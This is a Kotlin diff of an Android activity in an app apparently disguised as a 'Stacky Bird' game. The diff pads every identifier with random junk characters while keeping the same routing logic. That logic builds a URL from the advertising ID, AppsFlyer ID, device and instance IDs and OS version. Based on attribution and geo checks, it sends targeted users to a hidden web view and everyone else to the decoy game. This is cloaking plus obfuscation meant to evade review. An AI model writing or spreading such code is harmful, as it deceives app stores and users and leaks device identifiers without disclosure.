@@ -10,7 +10,7 @@ import com.appsflyer.AppsFlyerLib
 import com.kooapps.stackybirdandroidw.infiniti.InfiActivity
 import com.my.tracker.MyTracker
 import com.onesignal.OneSignal
-import com.kooapps.stackybirdandroidw.mamitaclasita.MamaClass.Companion.pampam
+import com.kooapps.stackybirdandroidw.mamitaclasita.MamaClass.Companion.pampampapapapapapapapa
 import com.kooapps.stackybirdandroidw.R
 import com.kooapps.stackybirdandroidw.gamamama.gameActivity.GamefiAct
 import org.json.JSONException
@@ -25,84 +25,6 @@ class FilerMeNow : AppCompatActivity() {
         createURL()
     }
 
-    fun createURL() {
-        val appsData = pampam["AppsData"]
-        val depData = pampam["FBData"]
-        val gaid = pampam["GAID"]
-        val view = pampam["View"]
-        val geoHost = pampam["GeoHose"]
-        val geo = pampam["GEO"]
-        val appsCheck = pampam["AppsCh"]
-        val trackerParams = MyTracker.getTrackerParams()
-
-        trackerParams.setCustomUserId(gaid)
-        pushToOS(gaid.toString())
-
-
-        val shP = getSharedPreferences("NEWPR", Context.MODE_PRIVATE)
-
-        val instID = MyTracker.getInstanceId(applicationContext)
-
-        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
-        AppsFlyerLib.getInstance().setCollectAndroidID(true)
-        val buildVers = Build.VERSION.RELEASE
-
-
-        val sub1 = "sub_id_1="
-        val sub2 = "ad_id="
-        val sub3 = "deviceID="
-        val sub4 = "sub_id_4="
-        val sub5 = "sub_id_5="
-        val nam = "naming"
-        val depp = "orgdeep"
-        val org = "organika"
-        val deep = "deep"
-
-        var link = ""
-
-        when (appsCheck) {
-            "1" ->
-                if (appsData != "null") {
-                    link =
-                        "$view$sub1$appsData&$sub3$afId&$sub2$gaid&$sub4$buildVers&$sub5$nam"
-                    shP.edit().putString("link", link).apply()
-                    shP.edit().putString("ENTRY_CODE", "web").apply()
-                    startActivity(Intent(this, InfiActivity::class.java))
-                    finish()
-                } else if (depData != null || geoHost!!.contains(geo.toString())) {
-                    link =
-                        "$view$sub1$depData&$sub3$afId&$sub2$gaid&$sub4$buildVers&$sub5$depp"
-                    shP.edit().putString("link", link).apply()
-                    shP.edit().putString("ENTRY_CODE", "web").apply()
-                    startActivity(Intent(this, InfiActivity::class.java))
-                    finish()
-                } else {
-                    startActivity(Intent(this, GamefiAct::class.java))
-                    finish()
-                }
-            "0" ->
-                if (depData != null) {
-                    link =
-                        "$view$sub1$depData&$sub3$instID&$sub2$gaid&$sub4$buildVers&$sub5$deep"
-                    shP.edit().putString("link", link).apply()
-                    shP.edit().putString("ENTRY_CODE", "web").apply()
-                    startActivity(Intent(this, InfiActivity::class.java))
-                    finish()
-
-                    Toast.makeText(this, "Null FB", Toast.LENGTH_LONG).show()
-                } else if (geoHost!!.contains(geo.toString())) {
-                    link = "$view$sub3$instID&$sub2$gaid&$sub4$buildVers&$sub5$org"
-                    shP.edit().putString("link", link).apply()
-                    shP.edit().putString("ENTRY_CODE", "web").apply()
-                    startActivity(Intent(this, InfiActivity::class.java))
-                    finish()
-                } else {
-                    startActivity(Intent(this, GamefiAct::class.java))
-                    finish()
-                }
-        }
-    }
-
     fun pushToOS(id: String) {
         OneSignal.setExternalUserId(
             id,
@@ -110,10 +32,10 @@ class FilerMeNow : AppCompatActivity() {
                 override fun onSuccess(results: JSONObject) {
                     try {
                         if (results.has("push") && results.getJSONObject("push").has("success")) {
-                            val isPushSuccess = results.getJSONObject("push").getBoolean("success")
+                            val isPushSuccessweqkleqwklejwqe = results.getJSONObject("push").getBoolean("success")
                             OneSignal.onesignalLog(
                                 OneSignal.LOG_LEVEL.VERBOSE,
-                                "Set external user id for push status: $isPushSuccess"
+                                "Set external user id for push status: $isPushSuccessweqkleqwklejwqe"
                             )
                         }
                     } catch (e: JSONException) {
@@ -121,11 +43,11 @@ class FilerMeNow : AppCompatActivity() {
                     }
                     try {
                         if (results.has("email") && results.getJSONObject("email").has("success")) {
-                            val isEmailSuccess =
+                            val isEmailSuccesswelqhqwjkhdd =
                                 results.getJSONObject("email").getBoolean("success")
                             OneSignal.onesignalLog(
                                 OneSignal.LOG_LEVEL.VERBOSE,
-                                "Set external user id for email status: $isEmailSuccess"
+                                "Set external user id for email status: $isEmailSuccesswelqhqwjkhdd"
                             )
                         }
                     } catch (e: JSONException) {
@@ -133,10 +55,10 @@ class FilerMeNow : AppCompatActivity() {
                     }
                     try {
                         if (results.has("sms") && results.getJSONObject("sms").has("success")) {
-                            val isSmsSuccess = results.getJSONObject("sms").getBoolean("success")
+                            val isSmsSuccesskelfhqfhfkqwejfhqwjkfq = results.getJSONObject("sms").getBoolean("success")
                             OneSignal.onesignalLog(
                                 OneSignal.LOG_LEVEL.VERBOSE,
-                                "Set external user id for sms status: $isSmsSuccess"
+                                "Set external user id for sms status: $isSmsSuccesskelfhqfhfkqwejfhqwjkfq"
                             )
                         }
                     } catch (e: JSONException) {
@@ -151,5 +73,83 @@ class FilerMeNow : AppCompatActivity() {
                     )
                 }
             })
+    }
+
+    fun createURL() {
+        val appsDataqweqweqweqweqweeqw = pampampapapapapapapapa["AppsData"]
+        val depDataqweqweqwqweqwe = pampampapapapapapapapa["FBData"]
+        val gaidqweqweqweqweasdasqwweqw = pampampapapapapapapapa["GAID"]
+        val viewqweqwesdfwqe = pampampapapapapapapapa["View"]
+        val geoHostqweqwdsqweqw = pampampapapapapapapapa["GeoHose"]
+        val geoqweqw455weqwe = pampampapapapapapapapa["GEO"]
+        val appsCheckwqeqweqwefdfgdtyrt = pampampapapapapapapapa["AppsCh"]
+        val trackerParamsasdqgqwqewef = MyTracker.getTrackerParams()
+
+        trackerParamsasdqgqwqewef.setCustomUserId(gaidqweqweqweqweasdasqwweqw)
+        pushToOS(gaidqweqweqweqweasdasqwweqw.toString())
+
+
+        val shPqweqwfqffqwef = getSharedPreferences("NEWPR", Context.MODE_PRIVATE)
+
+        val instIDqweqweqwdsdqwweqwe = MyTracker.getInstanceId(applicationContext)
+
+        val afIdeqwdfjhfgh = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
+        AppsFlyerLib.getInstance().setCollectAndroidID(true)
+        val buildVerseqwejkqwewhegqwjheqwe = Build.VERSION.RELEASE
+
+
+        val sub1erwkjhrjkweh = "sub_id_1="
+        val sub2qwekqwehqwejkqw = "ad_id="
+        val sub3wqkejqwhejkqwh = "deviceID="
+        val sub4weqwjkegk = "sub_id_4="
+        val sub5qwejqwhkejqwh = "sub_id_5="
+        val namqwejkqwhk = "naming"
+        val deppqwekjqwhk = "orgdeep"
+        val orgwqejkqheqjke = "organika"
+        val deepeqwkjghegwweioqw = "deep"
+
+        var linkqwejkhqwekqwj = ""
+
+        when (appsCheckwqeqweqwefdfgdtyrt) {
+            "1" ->
+                if (appsDataqweqweqweqweqweeqw != "null") {
+                    linkqwejkhqwekqwj =
+                        "$viewqweqwesdfwqe$sub1erwkjhrjkweh$appsDataqweqweqweqweqweeqw&$sub3wqkejqwhejkqwh$afIdeqwdfjhfgh&$sub2qwekqwehqwejkqw$gaidqweqweqweqweasdasqwweqw&$sub4weqwjkegk$buildVerseqwejkqwewhegqwjheqwe&$sub5qwejqwhkejqwh$namqwejkqwhk"
+                    shPqweqwfqffqwef.edit().putString("link", linkqwejkhqwekqwj).apply()
+                    shPqweqwfqffqwef.edit().putString("ENTRY_CODE", "web").apply()
+                    startActivity(Intent(this, InfiActivity::class.java))
+                    finish()
+                } else if (depDataqweqweqwqweqwe != null || geoHostqweqwdsqweqw!!.contains(geoqweqw455weqwe.toString())) {
+                    linkqwejkhqwekqwj =
+                        "$viewqweqwesdfwqe$sub1erwkjhrjkweh$depDataqweqweqwqweqwe&$sub3wqkejqwhejkqwh$afIdeqwdfjhfgh&$sub2qwekqwehqwejkqw$gaidqweqweqweqweasdasqwweqw&$sub4weqwjkegk$buildVerseqwejkqwewhegqwjheqwe&$sub5qwejqwhkejqwh$deppqwekjqwhk"
+                    shPqweqwfqffqwef.edit().putString("link", linkqwejkhqwekqwj).apply()
+                    shPqweqwfqffqwef.edit().putString("ENTRY_CODE", "web").apply()
+                    startActivity(Intent(this, InfiActivity::class.java))
+                    finish()
+                } else {
+                    startActivity(Intent(this, GamefiAct::class.java))
+                    finish()
+                }
+            "0" ->
+                if (depDataqweqweqwqweqwe != null) {
+                    linkqwejkhqwekqwj =
+                        "$viewqweqwesdfwqe$sub1erwkjhrjkweh$depDataqweqweqwqweqwe&$sub3wqkejqwhejkqwh$instIDqweqweqwdsdqwweqwe&$sub2qwekqwehqwejkqw$gaidqweqweqweqweasdasqwweqw&$sub4weqwjkegk$buildVerseqwejkqwewhegqwjheqwe&$sub5qwejqwhkejqwh$deepeqwkjghegwweioqw"
+                    shPqweqwfqffqwef.edit().putString("link", linkqwejkhqwekqwj).apply()
+                    shPqweqwfqffqwef.edit().putString("ENTRY_CODE", "web").apply()
+                    startActivity(Intent(this, InfiActivity::class.java))
+                    finish()
+
+                    Toast.makeText(this, "Null FB", Toast.LENGTH_LONG).show()
+                } else if (geoHostqweqwdsqweqw!!.contains(geoqweqw455weqwe.toString())) {
+                    linkqwejkhqwekqwj = "$viewqweqwesdfwqe$sub3wqkejqwhejkqwh$instIDqweqweqwdsdqwweqwe&$sub2qwekqwehqwejkqw$gaidqweqweqweqweasdasqwweqw&$sub4weqwjkegk$buildVerseqwejkqwewhegqwjheqwe&$sub5qwejqwhkejqwh$orgwqejkqheqjke"
+                    shPqweqwfqffqwef.edit().putString("link", linkqwejkhqwekqwj).apply()
+                    shPqweqwfqffqwef.edit().putString("ENTRY_CODE", "web").apply()
+                    startActivity(Intent(this, InfiActivity::class.java))
+                    finish()
+                } else {
+                    startActivity(Intent(this, GamefiAct::class.java))
+                    finish()
+                }
+        }
     }
 }
